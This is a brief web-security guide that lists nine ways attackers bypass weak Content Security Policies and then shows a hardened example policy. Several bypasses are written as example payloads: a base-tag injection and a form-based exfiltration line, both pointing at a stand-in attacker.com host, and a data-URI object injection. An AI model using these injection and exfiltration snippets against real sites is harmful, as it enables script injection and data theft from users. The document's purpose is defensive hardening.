Bypasses of common bad CSPs:
1. 'unsafe-inline' in script-src — completely defeats XSS protection.
2. Wildcards or trusted CDNs with JSONP/Angular/legacy gadgets — script-src https://*.googleapis.com once let attackers reach AngularJS templates that evaluate arbitrary expressions.
3. Missing object-src — attacker uses <object data="data:text/html,<script>..."> or Flash gadgets.
4. Missing base-uri — attacker injects <base href="https://attacker.com/"> and every relative script src now points at them.
5. Missing form-action — exfiltration via <form action="https://attacker.com"> auto-submitted by injected JS.
6. 'unsafe-eval' — attacker uses Function() / setTimeout(string) / eval().
7. Allowing 'data:' or '*' in script-src — script-src 'self' data: lets the attacker inject data: URIs containing scripts.
8. Same-origin open-redirector — script-src 'self' is bypassed if /redirect?to= follows arbitrary URLs (the script-src check is on the initial origin, not the final one).
9. dangling-markup / hanging-quote injections that capture the nonce — defeated by ensuring nonces are not reflected in HTML where injection happens.

A well-written CSP looks roughly like:

Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-RANDOM' 'strict-dynamic';
  style-src 'self' 'nonce-RANDOM';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'self';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
  require-trusted-types-for 'script';
  report-to csp-endpoint;

This policy is short, lacks 'unsafe-inline' and 'unsafe-eval', is not host-allowlist-dependent for scripts, and closes the common bypass paths.
